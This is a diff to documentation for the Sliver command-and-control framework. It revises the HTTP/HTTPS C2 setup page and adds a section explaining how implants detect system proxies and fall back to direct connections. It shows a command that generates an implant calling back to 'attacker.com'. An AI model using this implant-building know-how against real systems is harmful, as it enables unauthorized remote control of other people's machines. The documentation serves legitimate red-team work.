@@ -3,7 +3,7 @@
 
 # Setup
 
-Sliver supports proxy-aware (auto-detected) C2 over both HTTP and HTTPS, however since Sliver does not rely upon the SSL/TLS layer for security these protocols are considered somewhat synonymous. There are separate commands for the listeners but an implant generated with `--http` may attempt to connect over both HTTP and HTTPS (see "under the hood" for more details.
+Sliver supports proxy-aware C2 over both HTTP and HTTPS, however since Sliver does not rely upon the SSL/TLS layer for security these protocols are considered somewhat synonymous. There are separate commands for the listeners but an implant generated with `--http` may attempt to connect over both HTTP and HTTPS (see "under the hood" for more details.
  
 
 ## Generate the Implant
@@ -31,6 +31,15 @@ sliver > generate --http example.com,attacker.com
 [*] Build completed in 00:00:05
 [*] Implant saved to /Users/moloch/Desktop/IMPRESSED_METHANE
 ```
+
+#### Proxies
+
+The implant attempts to auto-detect proxy settings using a modified version of the [go-get-proxied](https://github.com/rapid7/go-get-proxied) library. It supports detection of system proxy settings on Windows, MacOS, and Linux. In the event the implant cannot make a successful HTTP/HTTPS connection for a given domain using the system proxy settings, it will also attempt to make a connection to the same domain ignoring the proxy settings. The order of connection attempts is as follows:
+
+1. HTTPS over system proxy
+1. HTTP over system proxy
+1. HTTPS direct connect
+1. HTTP direct connect
 
 
 ## Start the Listener 
